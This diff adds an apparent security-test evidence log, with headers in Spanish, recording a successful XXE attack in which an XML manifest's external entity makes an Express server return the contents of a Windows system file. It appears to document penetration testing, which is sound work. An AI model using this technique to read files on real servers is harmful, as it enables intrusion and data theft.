@@ -1,0 +1,16 @@
+﻿### A08_xxe_lectura_archivo - XXE - lectura de archivo via entidad externa en manifiesto XML
+### Fecha (UTC): 2026-10-04T22:52:28Z
+### Herramienta: curl.exe (binario nativo de Windows)
+------------------------------------------------------------
+### Respuesta:
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 165
+ETag: W/"a5-cX2LORECV+iLiGxhngnDA4N9XJo"
+Date: Sun, 04 Oct 2026 22:52:30 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"ok":true,"manifest":"<manifest><item>; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n</item></manifest>"}
+------------------------------------------------------------
